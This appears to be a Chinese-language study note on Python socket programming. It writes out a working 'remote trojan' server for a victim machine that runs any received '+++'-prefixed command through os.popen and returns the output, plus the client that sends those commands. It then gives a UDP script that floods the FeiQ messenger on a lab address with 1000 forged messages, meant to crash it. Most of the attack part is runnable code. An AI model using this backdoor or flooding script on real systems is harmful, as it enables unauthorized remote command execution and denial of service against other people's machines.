[TOC]



# ==网络通信与socket==

## 一、Socket

针对 TCP/IP 协议簇进行的程序封装，在 Windows和Linux均有这样的底层模块

[Python 网络编程 | 菜鸟教程 (runoob.com)](https://www.runoob.com/python/python-socket.html)

## 二、基于socket实现远程木马

[Python 网络编程 | 菜鸟教程 (runoob.com)](https://www.runoob.com/python/python-socket.html)

### 核心思想：将木马放在被攻击主机并开启作为服务器端，然后自己的主机作为攻击方（客户端）发送消息给服务器端，里面包含要执行的指令，让服务器执行指令并返回结果给客户端即可

流程：

### 1.编写服务器端

bind  是用来绑定服务器地址到一个套接字

accept  是用来接收客户端连接然后返回新的套接字，该套接字是元组形式，分别表示客户端和服务器端的连接通道以及客户端的信息



```python
def attack_talk():
    try:
        server_socket = socket.socket()
        server_socket.bind(('127.0.0.1', 5555))
        server_socket.listen()
        chanel, client = server_socket.accept()  # accept放在外面是防止accept的阻塞
        while True:
                message = chanel.recv(1024).decode()  # 先获取客户端发送的消息，判断如果数据是由 +++ 开头的，则说明这是一个指令，我需要执行该指令，并返回指令的运行结果
                if message.startswith('+++'):
                    command = message.split(',')[-1]
                    replay = os.popen(command).read()
                    chanel.send(f"命令{command}的运行结果：\n{replay}".encode())
                else:  # 否则就正常服务器与客户端对话
                    print(f"收到来自客户端的数据：{message}")
                    replay = message.replace("吗？", "!").encode()
                    chanel.send(replay)
    except:  # 这样是为了防止一个客户端断开连接时导致服务器连接也强制断开 如下我们可以确保服务器连接一直开着，且使得一个客户断开不会使得服务器也断开
        server_socket.close()
        attack_talk()

if __name__ == '__main__':
    attack_talk()
```



### 2.编写客户端

```python
import socket

client_socket = socket.socket()
client_socket.connect(('localhost',5555))
while True:
    message = input('请输入要发送的消息：').encode()
    client_socket.send(message)

    recieve = client_socket.recv(10240).decode()
    print(f"收到来自服务器的回复：{recieve}")

# client_socket.close()

```

客户端就简单很多了

创建客户端套接字连接对象，然后连接服务器端，发送消息给服务器端，并收取消息从服务器端

## 三、基于socket实现远程攻击

实验流程

我们使用python传输数据需要有哪些信息：

协议类型（TCP/UDP）端口号  IP地址

搞清楚 飞秋 传输信息使用的协议和传输数据的要求 等

![image-20240322195515918](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240322195515918.png)

从上图我们看出飞秋使用UDP传输协议，端口号为2425

飞秋的协议规则为：IPMSG 

```
版本号:包编号:发送者用户名:发送者主机名:命令字:附加信息
```

先了解飞秋的命令字，在下面的连接中

[和飞秋的通讯实现 - 张云飞VIR - 博客园 (cnblogs.com)](https://www.cnblogs.com/vir56k/archive/2011/07/11/2103378.html)

用python拼接出满足 飞秋 传输报文的消息体

```python
import socket,time,os

for i in range(1000):
    # 循环放在这里确保 每次都可以建立新的客户端，用新的客户端来发送消息，这样才能干爆
    s = socket.socket(family=socket.AF_INET,type=socket.SOCK_DGRAM)  # 表示以IPv4和UDP协议惊醒通信
    s.connect(('192.168.230.133',2425))
    # s.send("nihaoma".encode())

    packetid = str(time.time())  # 包编号
    username = 'father'
    hostname = 'Ymqyyds'
    command = str(0x00000020)
    content = 'This is a message from your dad'
    message = '1.0:' + packetid + ':' + username + ':' + hostname + ':' + command + ':' + content
    s.send(message.encode())


```

然后另一个飞秋用户（192.168.230.133）就可以收到 我们写代码的这台机器发送的数据（This is a message from your dad）。

**但请注意我们写的 for 循环：放在上面，也就是放在实例化套接字的上面，可以每一次循环都重新创建套接字连接对象，相当于在给飞秋用户发送信息时，每次都以 新的好友出现，此时就很容易将飞秋干爆**，如果我们将 for 循环放在下面，即发送数据的前面，就是以一个用户发送很多条消息，这样飞秋还不至于轻易崩溃

